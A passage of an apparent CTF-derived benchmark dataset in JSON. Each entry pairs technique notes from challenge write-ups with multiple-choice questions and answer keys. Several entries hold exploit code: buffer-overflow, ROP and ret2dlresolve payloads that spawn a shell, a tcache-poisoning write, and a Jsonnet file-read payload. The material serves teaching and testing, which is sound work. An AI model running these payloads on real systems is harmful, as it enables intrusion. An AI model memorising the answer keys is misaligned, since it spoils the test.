            "In challenges where files within a package (like a PowerPoint `.pptx` file, which is essentially a zip archive) appear to be corrupted or relevant data seems hidden, rename the file extension to `.zip` and extract its contents to explore individual components. This action can reveal hidden or embedded files that were not readily apparent, providing new avenues for investigation and potentially uncovering concealed flags within file directories such as `/ppt/media`."
        ],
        "question": [
            "In a cybersecurity challenge, you are given a seemingly corrupted image file that cannot be opened. Upon inspecting the file with a hex editor, you find that its magic bytes are incorrect for its claimed format. To correct the file and potentially uncover hidden data, what should the first few hex values be changed to if you suspect the file is actually a JPEG image, but was mistakenly labeled or presented as a different file type? - A. FF DA FF E0 - B. FF D8 FF E0 - C. 89 50 4E 47 - D. 50 4B 03 04",
            "In the context of a Capture the Flag challenge, if you suspect that key information is being hidden within a PowerPoint file, what initial step should you take to begin investigating the file's actual contents beyond what is presented through PowerPoint software? - A. Convert the PowerPoint file to a PDF. - B. Rename the PowerPoint file extension to .docx and open it in Word. - C. Rename the PowerPoint file extension to .zip and extract its contents. - D. Open the PowerPoint file in a text editor to view its raw code."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "A Prime Problem",
        "write_up": "dataset/raw/A Prime Problem.md",
        "type": "crypto",
        "competition": [
            "TexSAW/2023",
            "https://ctftime.org/event/1959/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "When given the modulus `n` in an RSA challenge and knowing that the primes `p` and `q` were generated in a way that makes `q` very close to `p` (as in, `q` is the next prime after `p` plus a relatively small integer `r`), the Fermat's factorization method can be a viable approach to factor `n`. This is especially effective under conditions laid out by the challenge or hinting towards small difference between the prime factors. Example code snippet for applying Fermat's factorization:\n```python\ndef isqrt(n):  \n   x = n  \n   y = (x + n // x) // 2  \n   while (y < x):  \n       x = y  \n       y = (x + n // x) // 2  \n   return x\n\ndef fermat(n):  \n   t0 = isqrt(n) + 1  \n   counter = 0  \n   t = t0 + counter  \n   temp = isqrt((t * t) - n)  \n   while ((temp * temp) != ((t * t) - n)):  \n       counter += 1  \n       t = t0 + counter  \n       temp = isqrt((t * t) - n)  \n   s = temp  \n   p = t + s  \n   q = t - s  \n   return p, q\n```",
            "After factoring `n` into `p` and `q`, the RSA algorithm requires calculating the private exponent `d` from the public exponent `e` and the totient `\u03c6(n)` (where `\u03c6(n) = (p-1)*(q-1)`), to decrypt the message. The modular inverse of `e` with respect to `\u03c6(n)` gives the value of `d`. This is a fundamental step in RSA decryption once the prime factors are known. Example code showing calculation of `d`:\n```python\nphi = (p-1)*(q-1)  \nd = pow(e, -1, phi)\n```"
        ],
        "question": [
            "When attempting to factorize an RSA modulus `n`, with the understanding that the prime factors `p` and `q` have a small difference relative to their sizes (i.e., `q` is the next prime after `p` plus a relatively small integer `r`), which of the following factorization methods is most appropriate? - A. Trial division - B. Elliptic Curve Factorization Method (ECM) - C. Fermat's factorization method - D. Pollard's rho algorithm ",
            "In the context of RSA decryption, after successfully factorizing the modulus `n` into its prime components `p` and `q`, which of the following steps is correct for calculating the private exponent `d` using the public exponent `e` and the totient `\u03c6(n)`? - A. d = e * \u03c6(n) - B. d = pow(e, -1, n) - C. d = pow(e, -1, phi) - D. d = e^2 mod \u03c6(n) "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "A secure database",
        "write_up": "dataset/raw/A secure database.md",
        "type": "The type of the CTF challenge described in the write-up is a `reverse` challenge.",
        "competition": [
            "SharkyCTF/2020",
            "https://ctftime.org/event/1034/tasks/"
        ],
        "score": 299,
        "max_score": 600,
        "difficulty": 0.49833333333333335,
        "knowledge": [
            "In challenges involving encrypted data retrieval where the correct password is required, analysis of the binary executable handling the password check can reveal hardcoded strings or comparison routines. These routines might compare user input with obfuscated or encoded passwords within the program. A methodical approach is to inspect the binary in a disassembler or a decompiler (such as Ghidra), identify the password handling and comparison mechanism, and decode or reverse-engineer the mechanism to obtain the correct password.",
            "For binary analysis challenges where understanding complex binary logic is time-consuming or infeasible, employing symbolic execution frameworks like `angr` can automate the extraction of passwords or other critical data. This technique involves scripting with `angr` to identify paths within the binary that lead to a successful execution state (e.g., correct password validation) and avoiding paths that lead to failure states. This can significantly reduce the time and effort required to solve challenges that would otherwise require intricate binary reverse engineering. \n   - Sample `angr` script structure to solve for a password:\n     ```python\n     import angr\n     import claripy\n     \n     binary_path = './binary_name'\n     project = angr.Project(binary_path, auto_load_libs=False)\n     password = claripy.BVS('password', 8 * 16)  # Adjust length as necessary\n     state = project.factory.entry_state(args=[binary_path], stdin=password)\n     simgr = project.factory.simulation_manager(state)\n     simgr.explore(find=0xAddressOfSuccess, avoid=0xAddressOfFailure)  # Replace with actual addresses\n     found = simgr.found[0]\n     print(found.posix.dumps(0))  # 0 represents file descriptor for stdin\n     ```\n   This strategy leverages `angr` to navigate through the binary programmatically, focusing on state exploration to dynamically deduce the correct input (e.g., password) by aiming for a success indicator (e.g., a success message) while avoiding failure conditions."
        ],
        "question": [
            "In a challenge requiring the decryption of a database with a password, an executable is analyzed, revealing the password through complex comparisons against hardcoded values. How can the correct password be determined from the binary?  - A. Recompile the binary with debugging symbols and step through the execution line by line. - B. Extract the hardcoded values and convert them from hexadecimal to ASCII. - C. Use network sniffing to intercept the password when it is entered. - D. Attempt common passwords and dictionary attacks against the executable's login function. ",
            "When faced with a binary analysis challenge that contains a convoluted password checking mechanism, which approach automates the extraction of the correct password, bypassing the need for detailed manual analysis?  - A. Manually reverse-engineering each function call associated with the password validation process. - B. Writing a Python script using the `angr` framework to perform symbolic execution and path exploration. - C. Deploying a brute-force attack using a list of commonly used passwords. - D. Inspecting the binary in a debugger, setting breakpoints on all conditional jumps. "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "A to Z",
        "write_up": "dataset/raw/A to Z.md",
        "type": "crypto",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 100,
        "max_score": 550,
        "difficulty": 0.18181818181818182,
        "knowledge": [
            "When facing a substitution cipher challenge, initially employ common letter shift techniques like ROT-N ciphers, where N ranges from 1 to 25, to quickly test for simple encryptions. Tools like the one available at http://theblob.org/rot.cgi can facilitate this process by efficiently iterating through all potential shifts. Example payload for ROT-13 (a common shift): `lmufhsb_eu_ao_hmr_jqmvh`",
            "If common substitution methods such as ROT-N ciphers do not yield results, consider employing the Atbash cipher, which is a special form of substitution cipher where each letter is mapped to its reverse counterpart in the alphabet (A <-> Z, B <-> Y, etc.). Tools like CyberChef (https://gchq.github.io/CyberChef/) can be used to apply an Atbash cipher easily. Knowledge of various types of substitution ciphers and resources that list them, like http://practicalcryptography.com/ciphers/substitution-category/, is invaluable for expanding one\u2019s capability to identify and solve cipher challenges more effectively."
        ],
        "question": [
            "When analyzing a substitution cipher, if the initial attempt with a ROT-13 transformation of `lmufhsb_eu_ao_hmr_jqmvh` doesn't decipher the given text, which of the following options should be considered next? - A. Increase the shift value to ROT-25. - B. Apply the Atbash cipher to reverse the alphabet mapping. - C. Decipher using a Caesar cipher with a left shift of 3. - D. Implement a Vigen\u00e8re cipher with a repeating key of 'ABC'.",
            "If common methods like ROT-N ciphers are ineffective in decrypting a piece of ciphertext and the cipher challenge might involve a simple substitution cipher, which tool is recommended for applying the Atbash cipher to potentially solve the challenge? - A. Use a simple online ROT cipher tool. - B. Implement a custom script in Python. - C. Utilize CyberChef with an Atbash recipe. - D. Refer to a Caesar cipher decoder."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "A Tour of x86 - Part 1",
        "write_up": "dataset/raw/A Tour of x86 - Part 1.md",
        "type": "The type of challenge is: reverse",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 50,
        "max_score": 1285,
        "difficulty": 0.038910505836575876,
        "knowledge": [
            "When faced with assembly code challenges, especially those running in 16-bit real-mode, understanding the role and default behaviors of specific registers and operations is crucial. For example, the `xor` operation with the same register (e.g., `xor dh, dh`) will always reset that register to 0. Being familiar with these operations can help decode the logic of the assembly code and solve challenges that ask for the values of certain registers after specific lines of code execute.",
            "In challenges involving assembly language, where you're required to deduce the state of the system at specific points (like register values), it's important to trace back the operations affecting those registers. This could involve identifying where a register is set and how it's manipulated across the code. For example, understanding that a register `si` is set to the value of another register `sp`, which in turn is set to 0 in a previous operation (`mov sp, cx` with `cx` set to 0), allows you to accurately determine the register's value at a given point without executing the code.\n\n**Example Payloads:**",
            "To answer \"What is the value of `dh` after line 129 executes?\", since the operation is `xor dh, dh`, any payload or response related to this operation should return `0x00`.",
            "For deducing the value of `ax` after certain operations like `mov al, 't'` and `mov ah, 0x0e`, the payload in solving the puzzle might look like calculating the combined value, resulting in `0x0e74`."
        ],
        "question": [
            "When analyzing a piece of assembly code that is running in 16-bit real-mode, what is the outcome of the operation `xor dh, dh`? - A. Sets `dh` to `0xFF` - B. Increments `dh` by 1 - C. Leaves `dh` undetermined - D. Resets `dh` to `0x00`",
            "In the context of troubleshooting assembly language code, you encounter the sequence where `si` is set by `mov si, sp`, and just prior, `sp` is set by `mov sp, cx` with `cx` previously set to `0`. What would be the value of `si` after these instructions? - A. `0xFFFF` - B. `0x0001` - C. `0x0000` - D. The value is unpredictable"
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "A Weird List of Sequences",
        "write_up": "dataset/raw/A Weird List of Sequences.md",
        "type": "misc",
        "competition": [
            "X-MAS/2018",
            "https://ctftime.org/event/724/tasks/"
        ],
        "score": 392,
        "max_score": 591,
        "difficulty": 0.6632825719120136,
        "knowledge": [
            "When facing a scenario requiring interaction with a captcha-protected service in a CTF challenge, utilizing a brute-force script to solve the captcha by generating MD5 hashes and comparing them can be effective. This method is applicable when the captcha is based on a known or guessable pattern that can be enumerated through brute force. For instance, if the captcha is a text or number challenge that can be hashed and checked against a given MD5 hash, a script can be used to automate the process.",
            "Automating the process of solving challenges that involve predicting or generating sequences (like number sequences) can significantly increase efficiency, especially when external tools or databases are available for assistance. In cases where a challenge involves identifying and continuing a sequence of numbers, the Online Encyclopedia of Integer Sequences (OEIS.org) can be a valuable resource. By automating the submission of sequences to OEIS and parsing the response for the next number in the sequence, challenges can be solved more rapidly and accurately, avoiding manual lookup and potential human error.\n   \nExample tool/library usage in the automation script:\n- `requests` library for sending GET requests to OEIS.org to retrieve information about the number sequence.\n- `pyquery` or similar HTML parsing libraries to extract the required information (e.g., the next number in the sequence) from the OEIS.org response."
        ],
        "question": [
            "When attempting to solve a captcha in a CTF challenge by brute-forcing through MD5 hashes, which Python library is crucial for generating MD5 hashes? - A. Pwntools - B. pyquery - C. requests - D. hashlib",
            "In a scenario where you're automating the submission of number sequences to the Online Encyclopedia of Integer Sequences (OEIS) to predict the next number in a CTF challenge, which Python library is essential for sending the GET request? - A. requests - B. hashlib - C. Pwntools - D. pyquery"
        ],
        "answer": [
            "D",
            "A"
        ]
    },
    {
        "name": "A3S",
        "write_up": "dataset/raw/A3S.md",
        "type": "This write-up describes a crypto challenge.",
        "competition": [
            "RaRCTF/2021",
            "https://ctftime.org/event/1342/tasks/"
        ],
        "score": 800,
        "max_score": 1500,
        "difficulty": 0.5333333333333333,
        "knowledge": [
            "When dealing with a custom encryption algorithm that resembles a well-known cipher but operates on a different numerical base (such as trinary systems instead of binary), analyzing the properties of the S-Box can reveal significant vulnerabilities. If the S-Box operations are found to be affine transformations (meaning they can be represented as linear transformations followed by a translation), the entire encryption process could potentially be reduced to an affine transformation of the plaintext. This property can be exploited to algebraically analyze and break the cipher. For example, the realization that an S-Box operation in a trinary-based encryption system (like the modified AES in the challenge) maintains affine properties allows for a straightforward decryption process once the affine relations are reversed. To check if an S-Box is an affine transformation, one can test if the sum of the outputs for two inputs equals the output for the sum of those inputs:\n    - SBOX[a] + SBOX[b] == SBOX[a+b]",
            "In cryptographic challenges where the key schedule (the process of expanding a short key into a series of separate round keys) is influenced by the properties of the S-Box, discovering that the S-Box performs affine transformations significantly impacts the complexity of the key expansion process, making it linear. This insight facilitates the decryption of ciphertexts if one can model the encryption and key expansion as mathematical operations in an appropriate finite field (such as GF(3) for trinary operations). By casting the problem into a system of linear equations within the finite field, one can potentially solve for the original encryption key or deduce key properties that allow decrypting the ciphertext. This approach hinges on algebraic manipulation using tools like SageMath to perform symbolic calculations and solve the systems of equations. For instance, techniques adapted to work in GF(3) and modifications to ensure compatibility with the custom encryption's mathematical operations are critical steps to model and solve the problem algebraically."
        ],
        "question": [
            "Considering a modified AES algorithm that operates on trits (base 3) instead of bits, and the discovery that the S-Box used in the algorithm is performing affine transformations, which of the following properties accurately describes an affine transformation for the purposes of decrypting or breaking the cipher? - A. SBOX[a] * SBOX[b] == SBOX[a*b] - B. SBOX[a] + SBOX[b] == SBOX[a+b] - C. SBOX[a] - SBOX[b] == SBOX[a/b] - D. SBOX[a] ^ SBOX[b] == SBOX[a^b] ",
            "In the context of analyzing an encryption algorithm similar to AES but designed for a trinary system, and realizing its S-Box and key expansion routines are affine, which mathematical tool or concept is crucial for solving for the original key by modeling the entire encryption as linear equations? - A. Differential cryptanalysis - B. Polynomial ring operations in GF(2) - C. Polynomial ring operations in GF(3) - D. Quantum computing "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "AAAAAAAAAAAAAAAA",
        "write_up": "dataset/raw/AAAAAAAAAAAAAAAA.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2022",
            "https://ctftime.org/event/1582/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities in programs that use unsafe functions like `gets`, which does not limit the amount of data read and can therefore overflow buffers, crafting a payload that exploits this vulnerability to overwrite adjacent memory is a fundamental technique. In scenarios where a specific condition (like a variable check) must be met post-overflow, the payload can be designed to fill the buffer up to the point of the target variable and then manipulate it as required. For example, if a buffer is 0x78 bytes from the base of a stack frame and a variable that controls program flow is directly after, filling the buffer with `0x78 - 0x9` bytes of arbitrary data followed by the desired value to manipulate the variable would achieve control over the program flow.\n\nExample payload: \n```python\npayload = b'A' * (0x78 - 0x9) + b'B'\n```",
            "In the presence of Return-Oriented Programming (ROP) opportunities, especially when the stack is executable (NX bit disabled) and stack canary protections are not in place, control over the execution flow can be obtained by overwriting the return address on the stack. If direct function calls like `execve` to spawn a shell are not feasible (due to reasons like protections, or the function behaves unexpectedly), utilizing gadgets within the binary or the concept of ret2dlresolve to call system functions indirectly can be a potent strategy. This technique involves arranging the stack or registers in a way that when returning control to a specific gadget or function, it will execute system calls with parameters we control, leading to arbitrary code execution.\n\nExample payload (using ret2dlresolve):\n```python\nfrom pwn import *\n\nbinary = context.binary = ELF('./binary_name', checksec=False)\nrop = ROP(binary)\nret = rop.find_gadget(['ret'])[0]\n\ndl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])\n\nrop.raw(ret)\nrop.gets(dl.data_addr)\nrop.ret2dlresolve(dl)\n\npayload  = b'A' * 0x78 # Buffer overflow up to return address\npayload += rop.chain()\npayload += b'\\n'\npayload += dl.payload\n```"
        ],
        "question": [
            "In an exploitation scenario where a program uses `gets` to receive input into a local buffer, thereby allowing an attacker to overflow this buffer, how should a payload be crafted to alter a nearby variable after the buffer, given the buffer is 0x78 bytes from the base of the stack frame and the target variable is immediately after it?  - A. Fill the buffer with 0x78 bytes of 'A' and append 'B' - B. Fill the buffer with 0x77 bytes of 'A' and append 'B' - C. Fill the buffer with (0x78 - 0x9) bytes of 'A' and append 'B' - D. Fill the buffer with (0x78 / 2) bytes of 'A' and append 'B' ",
            "In scenarios where stack canary and non-executable stack (NX bit enabled) protections are absent, allowing Return-Oriented Programming (ROP) attacks, which strategy can be employed to bypass limitations of direct function calls for achieving arbitrary code execution if the direct call to `execve` function behaves unexpectedly or is not directly achievable?  - A. Use a `ret2dlresolve` technique to indirectly call `system` with controlled parameters - B. Overwrite the stack canary with 'A's and call `execve` directly - C. Directly modify the .got.plt entry of the `execve` function to point to `system` - D. Use a stack pivot to transfer control to a non-ROP section of the binary "
        ],
        "answer": [
            "C.",
            "A."
        ]
    },
    {
        "name": "Ace of Spades",
        "write_up": "dataset/raw/Ace of Spades.md",
        "type": "pwn",
        "competition": [
            "PwnThyBytes/2019",
            "https://ctftime.org/event/756/tasks/"
        ],
        "score": 964,
        "max_score": 1000,
        "difficulty": 0.964,
        "knowledge": [
            "In scenarios involving buffer overflow or memory corruption vulnerabilities, utilizing overlapping buffers with functions like `strcpy` can lead to duplicate or altered memory content. This can be exploited in a controlled manner to affect program behavior or manipulate memory, especially when certain string lengths trigger unintended behavior. This principle is generally applicable in exploiting unsafe string operations where boundary checks are not properly implemented. Example payload and scenario setup:\n\n```python\ndef exploit_strcpy_bug(program):\n    for _ in range(52):  # Triggering the condition\n        draw_card(program)  \n    current_hand = print_hand(program)  \n    for _ in range(52):  \n        discard_card(program)  \n        new_hand = print_hand(program)  \n        if current_hand[1:] != new_hand:  \n            print('Exploited strcpy bug')  \n        current_hand = new_hand  \n    fold_hand(program)\n```",
            "In challenges that involve deterministic outcomes from pseudo-random number generators (RNGs) or where the RNG seed is not properly randomized (e.g., stored in a predictable location or read from a predictable source like `/dev/urandom` without error checking), manipulating or predicting the state of the RNG can lead to controlled or predictable behavior of the application. This can be particularly useful in bypassing randomness-based security mechanisms or influencing the application to enter a favorable state. Example strategy: Overwhelm the system RNG to force `read()` to return a predictable number of bytes, or exploit predictable seed placement to calculate future RNG outputs.\n\n*Note: Specific payload generation for RNG manipulation depends on the application's implementation details and RNG characteristics, thus a general payload example is not provided. The concept, however, is universally applicable for similar vulnerabilities across different scenarios.*"
        ],
        "question": [
            "In an application, a `strcpy` bug triggers when copying a string to an overlapping memory location, causing unintended duplication of characters in the destination buffer. Considering this scenario, which approach would correctly exploit the `strcpy` bug to achieve duplicated characters in memory? - A. Ensuring the destination and source strings are the same length to prevent memory corruption. - B. Using `strcpy` to copy non-overlapping buffers to avoid triggering the bug. - C. Triggering the bug by manipulating `strcpy` with overlapping source and destination buffers with specific lengths. - D. Using boundary-checked functions like `strncpy` to safely copy strings and avoid exploitation. ",
            "In a game that fails to properly randomize its RNG seed, which could potentially be exploited by overwhelming the system's RNG or predicting the placement and value of the seed, what approach would most directly allow an attacker to influence or predict the game's state? - A. Selecting options randomly in hopes of eventually finding a pattern in the game's outcomes. - B. Writing a custom RNG implementation and forcing the game to use it instead of its default one. - C. Analyzing the game's code or memory to find and exploit the predictable RNG seed or its consequences. - D. Avoiding any interaction with the game's RNG-related features, focusing instead on other types of vulnerabilities. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "aces-aes",
        "write_up": "dataset/raw/aces-aes.md",
        "type": "crypto",
        "competition": [
            "JerseyCTF/2024",
            "https://ctftime.org/event/2230/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving encrypted messages, scrutinizing the accompanying files for clues is vital. An incomplete encryption scheme code fragment, ciphertext, and possibly relevant logs or external postings can provide critical insights for constructing or deconstructing the encryption. Upon discovering parameters like the encryption mode or password, one can leverage libraries like `pyaes` for Advanced Encryption Standard (AES) functionalities and `pbkdf2` for key derivation. This situation underscores the importance of closely examining all provided materials for hidden clues that can aid in decrypting messages.\n   - Example insight: The password for encryption schemes could be derived from contextual clues hidden in seemingly unrelated files, such as logs referring to specific keywords or names (e.g., the true name of a character with spaces replaced by dashes).",
            "The initialization vector (IV) for an encryption scheme might not be explicitly given and may require deductive reasoning or external exploration, such as analyzing different challenges or conducting open-source intelligence (OSINT) on hacker forums or related websites. This emphasizes the significance of considering all aspects of a challenge, including seemingly unrelated components or other challenge series. Once the IV is known, along with the key derived from the correct password and salt via PBKDF2, one can decrypt the ciphertext using the identified encryption mode, revealing the plaintext message.\n   - Example insight: In the context of AES in Counter (CTR) mode, both the key and IV are crucial for decryption. The key can be derived using PBKDF2 with a known password and salt, while the IV might need to be obtained from external sources or inferred from the challenge context."
        ],
        "question": [
            "In an encryption scheme challenge where fragments of code and a ciphertext are given, the correct usage of libraries for encryption and decryption processes is crucial. If a participant has identified the password 'anung-un-rama' and has a 128-bit salt `8b70821d8d9af4a7df4abe98a8fb72d1`, which Python library and function combination should they use to derive a 256-bit encryption key? - A. `secrets.choice(password, soSalty).read(32)` - B. `pbkdf2.PBKDF2('anung-un-rama', soSalty).read(32)` - C. `hashlib.pbkdf2_hmac('sha256', password, soSalty, 100000)` - D. `Crypto.Cipher.AES.new(password, soSalty)`",
            "When addressing the need to determine an unknown initialization vector (IV) for decrypting a ciphertext in a CTF challenge, which method is NOT a practical approach to acquiring the IV? - A. Scouring hacker forums or similar platforms where the attackers might share details or hints about the encryption scheme. - B. Guessing the IV based on the length or format specifications typically associated with the encryption mode. - C. Conducting an exhaustive brute-force attack against all possible IV values until the correct plaintext is revealed. - D. Reviewing related challenges or open-source intelligence (OSINT) for mentions of the IV or relevant encryption details."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Ada Lovelace",
        "write_up": "dataset/raw/Ada Lovelace.md",
        "type": "pwn",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge where exploitation of the `tcache` (thread-local cache) is hinted, one can manipulate the `tcache` list through a tcache poisoning attack by carefully deallocating (freeing) and reallocating memory chunks to control the memory layout. This approach can enable the overwrite of specific memory addresses with arbitrary values. To execute this attack, it's essential to perform operations in the following order: allocate two chunks, free them in reverse order to manipulate the `tcache` linked list, and then use a subsequent allocation to write to a controlled address.",
            "When dealing with challenges that mention specific GLIBC versions and hint towards using system metadata (like a \"super secret xor key\"), it's crucial to understand and exploit the GLIBC's safe-linking mechanism for the `tcache`. Safe-linking protects pointers by XORing them with a secret derived from their memory location. By obtaining a leaked pointer value (presented in the challenge as the xor key), one can reverse the safe-linking protection by XORing the target address with the leaked key, allowing for a controlled write operation to a location like a global variable. This technique is particularly effective when ASLR (Address Space Layout Randomization) is disabled or when the leak allows for the prediction or calculation of the secret key.\n  \n   Example Payload Step: `F0e9d4000050550000` where `e9d4000050550000` is the XORed payload address derived from the target address and the leaked \"super secret xor key\", designed to overwrite the specific memory address with desired values using the tcache poisoning technique."
        ],
        "question": [
            "In an exploitation scenario involving the thread-local cache (tcache) of GLIBC, an attacker aims to manipulate the `tcache` linked list to overwrite specific memory addresses. Given the steps to perform a tcache poisoning attack correctly, what is the correct sequence of operations that leads to a successful exploitation? - A. Free two allocated chunks, allocate a chunk, then delete it to control the memory layout. - B. Allocate two chunks, free them in reverse order, and use subsequent allocations to influence the tcache list for arbitrary writes. - C. Allocate a chunk, free it, then immediately reallocate it twice to overwrite its contents. - D. Delete an allocated chunk twice before reallocating it to achieve controlled memory access.",
            "In a context where an exploit must bypass the GLIBC 2.35 `safe-linking` mechanism using a leaked \"super secret xor key,\" which operation would correctly utilize the leaked key for a tcache poisoning attack to overwrite a global variable? - A. XOR the leaked key with the global variable's address, then use an 'allocate' command to overwrite the global variable. - B. Allocate a chunk, use the leaked key directly in a 'fill' command without modification to manipulate the tcache list. - C. XOR the target address with the leaked key, then use a 'fill' command with the XORed value to overwrite the desired memory address. - D. Directly use the leaked key as an address in a 'delete' command to free the desired memory address."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Admin CLI",
        "write_up": "dataset/raw/Admin CLI.md",
        "type": "This write-up describes a hash collision challenge in a Java class file where the goal is to create a URL that has the same hash code as specified in the challenge. Based on the provided information, I would classify this challenge as a **crypto** challenge.",
        "competition": [
            "FE-CTF/2023",
            "https://ctftime.org/event/1979/tasks/"
        ],
        "score": 1,
        "max_score": 1,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving hash collision, if the goal is to match a specific hash code for an object (like a URL in Java), one can manipulate parts of the object that don't influence the hash function to inject arbitrary data without affecting the hash outcome. Specifically, in Java's `java.net.URL` class, the authority part of the URL can be set to arbitrary data (such as an API_KEY or flag placeholder) because the hash code calculation does not consider the authority part, allowing for the injection of data while maintaining the desired hash code.",
            "When a challenge's logic involves calculating hash codes with conditions that include URL components like the port, it's possible to manipulate the port number to achieve a desired hash code. Since the port number directly influences the hash code in a predictable manner (adding its numeric value to the hash), one can calculate the difference needed from the target hash code and use that as the port number in the URL, thus matching the target hash code while controlling other parts of the URL for further exploitation, such as leveraging vulnerabilities like Log4Shell."
        ],
        "question": [
            "In a cybersecurity challenge focusing on Java's `java.net.URL` hash collision, to achieve a desired hash code for a URL without affecting the hash with the flag data, where should the flag data (API_KEY) be placed within the URL to exploit the fact that the hash function does not take this part of the URL into account?  - A. In the URL's path section - B. In the query parameters - C. As a part of the URL's authority - D. Within the fragment section ",
            "During a challenge involving crafting a Java URL object to match a specific hash code, if the hash code calculation considers the port number and you need to match a target hash code, how could you manipulate the port number to achieve a desired hash outcome?  - A. Subtract the target hash code from the default port number and use this as the new port - B. Set the port number to a negative value that represents the absolute difference from the target hash code - C. Directly set the port number to the target hash code - D. Calculate the difference between the current URL hash code and the target hash code, then add this difference as the port number "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Admin",
        "write_up": "dataset/raw/Admin.md",
        "type": "pwn",
        "competition": [
            "ASIS/2020/Quals",
            "https://ctftime.org/event/964/tasks/"
        ],
        "score": -1.0,
        "max_score": 375,
        "difficulty": -1,
        "knowledge": [
            "When exploiting binary files with a buffer overflow vulnerability due to unsafe functions like `gets()`, and when the executable has certain protections like NX enabled but lacks stack canaries and PIE (Position Independent Executable), crafting a Return-Oriented Programming (ROP) chain is an effective technique. This method involves finding and utilizing gadgets within the binary or loaded libraries to control the behavior of the application and ultimately execute arbitrary code, such as spawning a shell. In the presence of stack execution prevention (NX), ROP can be used as it does not rely on executing code from the stack but rather executes existing code snippets (\"gadgets\") in a sequence chosen by the attacker.",
            "In preparing a ROP chain for an `execve(\"/bin/sh\", NULL, NULL)` syscall on an x86_64 architecture, specific registers need to be set up accordingly: `rdi` must contain the address of the command string (e.g., \"/bin/sh\"), `rsi` should be zeroed out (NULL pointer for argv), and `rdx` also needs to be zeroed out (NULL pointer for envp). Following the preparation of these registers, invoking the `syscall` instruction will trigger the execution of `execve` with the desired command. This setup typically involves gadgets to pop values into the required registers (`pop_rdi`, `pop_rsi`, `pop_rdx`) and a way to trigger the syscall. The example payload demonstrates this sequence, including a method to write the \"/bin/sh\" string into memory before executing the syscall, by redirecting the execution flow to a `gets()` function call with a controlled destination address.\n\nExample payload snippet:\n```\nrop = flat([\n    'a'*72, # Padding\n    pop_rdi, # Gadget to pop next value into rdi\n    write_mem, # Address to store \"/bin/sh\"\n    gets, # Call gets to write \"/bin/sh\" into write_mem\n    pop_rdi, write_mem, # Prepare rdi again for execve syscall\n    pop_rax, 0x3b, # Set rax to syscall number for execve\n    pop_rsi, 0x0, # Zero out rsi\n    pop_rdx, 0x0, # Zero out rdx\n    syscall # Trigger the syscall\n])\n```"
        ],
        "question": [
            "In a scenario where an ELF binary with a buffer overflow vulnerability caused by the `gets()` function is being exploited, and the binary has NX enabled but lacks stack canaries and Position Independent Executable (PIE), which of the following techniques is recommended for executing arbitrary code? - A. Use a simple stack overflow to inject and execute shellcode directly on the stack. - B. Employ format string vulnerabilities to overwrite the return address. - C. Craft a Return-Oriented Programming (ROP) chain to execute pre-existing code snippets in a controlled sequence. - D. Exploit a heap overflow to corrupt the application's memory management data structures. ",
            "In the process of setting up a ROP chain for executing an `execve(\"/bin/sh\", NULL, NULL)` syscall on an x86_64 system, what is the correct sequence of registers to be set up before the `syscall` instruction is invoked? - A. `rdi` must contain the address where \"/bin/sh\" is stored, `rsi` should be zeroed out, and `rdx` also needs to be zeroed out. - B. `rax` must contain the `/bin/sh` string, `rdi` should hold the syscall number, and `rsi` should be zeroed out. - C. `rdx` needs to contain the address of the \"/bin/sh\" string, `rdi` and `rsi` should both hold the syscall number. - D. `rsi` must contain the address where \"/bin/sh\" is stored, `rdi` should be zeroed out, and `rax` should hold the syscall number. "
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "Advanced Json Cutifier",
        "write_up": "dataset/raw/Advanced Json Cutifier.md",
        "type": "web",
        "competition": [
            "Mapna/2024",
            "https://ctftime.org/event/2205/tasks/"
        ],
        "score": 59,
        "max_score": 375,
        "difficulty": 0.15733333333333333,
        "knowledge": [
            "When encountering an error message in a challenge that involves parsing or compiling, such errors can reveal the underlying technology or libraries used. This can be used as a clue to identify the library and explore its known issues or vulnerabilities which might be exploited in the challenge. Always consider searching for error messages verbatim online as they may directly lead to the identification of the tool or library in use.",
            "For challenges involving file reading where direct file access is restricted or seems impossible, exploring the issue tracker or documentation of the involved library or tool can reveal unintended features or exploits. Specifically, in scenarios involving data formatting or transformation libraries, look for features that allow importing or including external files, which can be exploited to read restricted files if the application fails to adequately secure against such behavior. \nExample payload for reading a file when a library supports file import or inclusion:\n```json\n{\n   \"key\": importstr \"/flag.txt\"\n}\n```"
        ],
        "question": [
            "In a web challenge, you encounter error messages like \"Expected token OPERATOR but got \"}\" and \"Expected a comma before next field\" from the server while trying to cause errors intentionally. These error messages can be crucial in identifying what? - A.The exact server operating system being used - B.The specific web server software (e.g., Nginx, Apache) in operation - C.The underlying library or technology used for parsing or compiling - D.The programming language of the server-side code",
            "In a challenge involving restrictions on direct file reading, but allows for processing JSON data, which of the following JSON payloads could potentially exploit a library feature to read the content of \"/flag.txt\"? - A.`{\"readFile\": \"/flag.txt\"}` - B.`{\"include\": \"file:///flag.txt\"}` - C.`{\"$import\": \"/flag.txt\"}` - D.`{\"key\": importstr \"/flag.txt\"}`"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
